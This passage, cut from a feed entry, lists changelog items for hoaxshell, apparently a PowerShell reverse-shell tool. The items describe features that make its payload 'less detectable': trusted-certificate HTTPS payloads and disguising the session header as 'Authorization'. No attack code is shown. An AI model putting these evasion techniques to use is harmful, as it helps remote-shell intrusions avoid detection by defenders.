&lt;code&gt;https_payload_trusted.ps1&lt;/code&gt; were added. You can now use hoaxshell by supplying a domain name along with a trusted certificate. This will generate a shorter and less detectable https payload.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;01/09/2022&lt;/code&gt; - Added the &lt;code&gt;-H&lt;/code&gt; option which allows users to give a custom name to the (random by default) header utilized in the attack process, carring the shell&#39;s session id. This makes the attack less detectable e.g. by using a standard header name e.g. &#34;Authorization&#34;.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;31/08/2022&lt;/code&gt; - Added the &lt;code&gt;-i&lt;/code&gt; option that generates the PS payload adjusted to use &#34;Invoke-RestMethod&#39; instead of &#39;Invoke-WebRequest&#39; utility, so now the user can choose (thanks to this &lt;a href=&#34;https://github.com/t3l3machus/hoaxshell/issues/8&#34;&gt;issue&lt;/a&gt;). I also fixed a bug that existed in the prompt (it sometimes messed the path).&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
</feed>